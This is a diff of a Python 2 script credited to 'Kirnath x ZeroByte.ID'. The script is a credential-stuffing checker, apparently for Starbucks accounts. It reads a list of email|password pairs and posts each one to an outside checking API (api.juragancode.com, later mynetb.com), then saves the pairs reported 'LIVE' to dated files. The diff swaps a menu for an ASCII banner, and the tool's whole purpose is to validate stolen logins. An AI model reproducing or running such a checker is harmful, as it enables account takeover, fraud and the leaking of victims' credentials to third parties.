@@ -1,14 +1,12 @@
-# /usr/lib/python
-# Kirnath x ZeroByte.ID
-
 import requests
 import sys
+import os
+import termcolor
+import json
 import time
 from datetime import datetime
-import json
-import os
 
-class bcolors:
+class warna:
     HEADER = '\033[95m'
     OKBLUE = '\033[94m'
     OKGREEN = '\033[92m'
@@ -17,59 +15,61 @@ class bcolors:
     ENDC = '\033[0m'
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
-
-print "Choose Service\n1. Mass Checking\n2. Single Check"
-data = int(raw_input("Choose: "))
-url = "http://api.juragancode.com/sbux.php"
-headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36',
-			'Accept': '*/*'}
-if data == 1:
-	print "[+] Starting Engine..."
-	start_time = time.time()
-	time.sleep(2)
-	file = str(raw_input("[+] Enter File Name: "))
-	x = open(file, "r")
-	read = x.read().split("\n")
-	for i in read:
-		params={'ajax':'1',
-				'do': 'check',
-				'data':'%s'%i}
-		s = requests.Session()
-		do = s.post(url, params, headers=headers)
-		respon = do.text
-		result = json.loads(respon)
-		colorized = result["error"]
-		if colorized ==0 :
-			print bcolors.OKGREEN + result["msg"]
-			live = bcolors.OKGREEN + result["msg"]
-			save = str(live)
-			tanggal = datetime.today()
-			dtwithoutseconds = tanggal.replace(second=0, microsecond=0)
-			date = str(dtwithoutseconds).replace(':', '_')
-			filename = u"LIVE-%s.txt"%date
-			# filename = slugify(filename)
-			save = open(filename, 'a')
-			save.write(live+'\n')
-			save.close()
-		else:
-			print bcolors.FAIL + result["msg"]
-	elapsed_time = time.time() - start_time
-	print "[+] Job Done!"
-	print "[+] Total Time: ",elapsed_time
-	print "[+] Result was Saved as LIVE-{}.txt".format(date)
-if data ==2:
-	file = str(raw_input("[+] Email: "))
-	file2 = str(raw_input("[+] Password: "))
-	i = file+"|"+file2
-	params = {'ajax':'1',
-				'do': 'check',
-				'data':'%s'%i}
-	s = requests.Session()
-	do = s.post(url, params, headers=headers)
-	respon = do.text
-	result = json.loads(respon)
-	colorized = result["error"]
-	if colorized ==0 :
-		print bcolors.OKGREEN + result["msg"]
-	else:
-		print bcolors.FAIL + result["msg"]
+w       = warna.HEADER + " _   ___                  _   _     \n" + warna.ENDC
+gans    = warna.HEADER + "| | / (_)                | | | |    \n" + warna.ENDC
+sangat  = warna.HEADER + "| |/ / _ _ __ _ __   __ _| |_| |__  \n" + warna.ENDC
+kirnath = warna.HEADER + "|    \| | '__| '_ \ / _` | __| '_ \ \n" + warna.ENDC
+coded   = warna.HEADER + "| |\  \ | |  | | | | (_| | |_| | | |\n" + warna.ENDC
+me      = warna.HEADER + "\_| \_/_|_|  |_| |_|\__,_|\__|_| |_|\n" + warna.ENDC
+exit = "[========]"
+for l in w:
+    sys.stdout.write(l)
+    sys.stdout.flush()
+    time.sleep(0.01)
+for l in gans:
+    sys.stdout.write(l)
+    sys.stdout.flush()
+    time.sleep(0.01)
+for l in sangat:
+    sys.stdout.write(l)
+    sys.stdout.flush()
+    time.sleep(0.01)
+for l in coded:
+    sys.stdout.write(l)
+    sys.stdout.flush()
+    time.sleep(0.01)
+for l in me:
+    sys.stdout.write(l)
+    sys.stdout.flush()
+    time.sleep(0.01)
+print warna.BOLD + warna.WARNING + "                       ZeroByte.ID\n" + warna.ENDC + warna.ENDC
+tanya = str(raw_input("Enter Mailist File: "))
+openfile = open(tanya, 'r')
+url = 'http://mynetb.com/api/sbux/api.php'
+start_time = time.time()
+for i in openfile:
+    r = requests.post(url, data={'mailpass':i}, verify=False)
+    # print r.text
+    res = json.loads(r.text.replace('\n', ''))
+    if "LIVE" in res['msg']:
+        print warna.OKGREEN + res['msg'] + warna.ENDC
+        live = res['msg']
+        tanggal = datetime.today()
+        dtwithoutseconds = tanggal.replace(second=0, microsecond=0)
+        date = str(dtwithoutseconds).replace(':', '_').replace(' ', '_')
+        filename = u"LIVE-%s.txt"%date
+        # filename = slugify(filename)
+        save = open(filename, 'a')
+        save.write(str(live)+'\n')
+        save.close()
+    elif "DIE" in res['msg']:
+        print warna.FAIL + res['msg'] + warna.ENDC
+    elif "UNCHECKED" in res['msg']:
+        print warna.WARNING + "UNCHECKED" + i + warna.ENDC
+    else:
+        print "Unknown Error, please contact admin"
+        exit()
+elapsed_time = time.time() - start_time
+print "[+] Job Done!"
+print "[+] Total Time: ",elapsed_time
+print "[+] Result was Saved as LIVE-{}.txt".format(date)
